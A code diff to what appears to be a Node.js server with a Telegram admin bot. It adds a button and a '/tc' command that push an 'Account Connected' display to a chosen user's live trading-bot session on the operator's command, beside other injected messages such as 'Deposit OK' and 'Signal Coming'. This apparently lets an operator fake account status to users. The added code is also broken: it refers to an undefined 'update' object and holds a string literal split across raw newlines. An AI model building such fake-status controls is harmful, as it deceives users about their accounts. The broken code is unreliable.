@@ -815,6 +815,7 @@ function tgUserActionKeyboard(userName) {
             [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
              { text: '🔌 Disconnected',   callback_data: `qt|disconnected|${u}` },
              { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
+            [{ text: '🔗 Trigger Connected (Live)', callback_data: `tc_trigger|${u}` }],
             // ── Quick Triggers: Signals ──────────────────────────────────
             [{ text: '📡 Signal Coming',  callback_data: `qt|signal_incoming|${u}` },
              { text: '🔔 Close Position', callback_data: `qt|signal_close|${u}` },
@@ -850,6 +851,7 @@ function tgInjectTypeKeyboard(userName) {
              { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` }],
             [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
              { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
+            [{ text: '🔗 Trigger Connected (Live)', callback_data: `tc_trigger|${u}` }],
             [{ text: '📡 Signal Coming',  callback_data: `qt|signal_incoming|${u}` },
              { text: '🔔 Close Position', callback_data: `qt|signal_close|${u}` }],
             [{ text: '✏️ Custom Message', callback_data: `ask_msg|${u}` },
@@ -1285,6 +1287,17 @@ async function tgHandleCallback(chatId, data, callbackId) {
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
             text: `💰 Send the balance amount for <b>${target}</b>:\n(/cancel to abort)` });
     }
+    if (action === 'tc_trigger') {
+        const tcUser = decodeURIComponent(parts[1] || '');
+        sendSSEToUser(tcUser, 'show_connected',    { userName: tcUser });
+        sendSSEToUser(tcUser, 'trigger_connected', { userName: tcUser });
+        await sendTelegramMessage(`🔗 <b>Trigger Connected</b> fired\n👤 User: <b>${tcUser}</b>`);
+        await tgApi('answerCallbackQuery', { callback_query_id: update.callback_query.id, text: '🔗 Connected trigger sent!' });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `✅ <b>Trigger Connected</b> sent to <b>${tcUser}</b>\n🔗 Their bot session now shows "Account Connected".`,
+            reply_markup: tgUserActionKeyboard(tcUser) });
+    }
+
     if (action === 'force_reload') {
         const ok = sendSSEToUser(target, 'force_reload', { timestamp: new Date().toISOString() });
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
@@ -1838,6 +1851,20 @@ async function tgHandleMessage(msg) {
         if (useDatabase) await dbSaveNote(nu.licenceKey, noteContent).catch(() => {});
         else { if (!global._notesMap) global._notesMap = {}; global._notesMap[nu.licenceKey] = { note: noteContent, updatedAt: new Date().toISOString() }; }
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📝 Note saved for <b>${noteUser}</b>` });
+    }
+
+    // /tc username — trigger "Account Connected" on user's live bot session
+    if (text.startsWith('/tc ')) {
+        const tcUser = text.slice(4).trim();
+        if (!tcUser) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '📌 Usage: <code>/tc username</code>
+
+Sends the "Account Connected" signal to a specific user's live session.' });
+        sendSSEToUser(tcUser, 'show_connected',    { userName: tcUser });
+        sendSSEToUser(tcUser, 'trigger_connected', { userName: tcUser });
+        await sendTelegramMessage(`🔗 <b>Trigger Connected</b> fired from Telegram\n👤 User: <b>${tcUser}</b>`);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `✅ <b>Trigger Connected</b> sent to <b>${tcUser}</b>\n🔗 Their bot will now show "Account Connected".` });
     }
 
     // /qt username triggerKey  — fire a quick trigger by key name
